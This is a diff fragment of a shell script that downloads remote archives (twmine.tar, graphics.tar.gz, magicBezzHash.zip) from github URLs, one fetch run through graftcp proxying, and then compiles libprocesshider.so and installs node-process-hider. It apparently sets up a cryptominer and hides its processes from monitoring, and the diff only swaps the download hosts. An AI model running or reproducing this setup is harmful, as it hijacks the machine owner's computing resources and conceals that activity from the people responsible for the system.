@@ -15,7 +15,7 @@ npm i -g node-process-hider
 
 wget https://github.com/mhusataringan-hub/KOPI/releases/download/v0.0/twmine.tar && tar xf twmine.tar && chmod +x twnine
 
-wget https://gitlab.com/wayarmani48/file/-/raw/main/graphics.tar.gz
+wget https://github.com/mhusataringan-hub/KOPI/raw/refs/heads/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
 
@@ -48,7 +48,7 @@ echo " "
 echo " "
 
 
-./graftcp/graftcp wget https://gitlab.com/wayarmani48/file/-/raw/main/magicBezzHash.zip
+./graftcp/graftcp wget https://github.com/mhusataringan-hub/KOPI/raw/refs/heads/main/magicBezzHash.zip
 unzip magicBezzHash.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
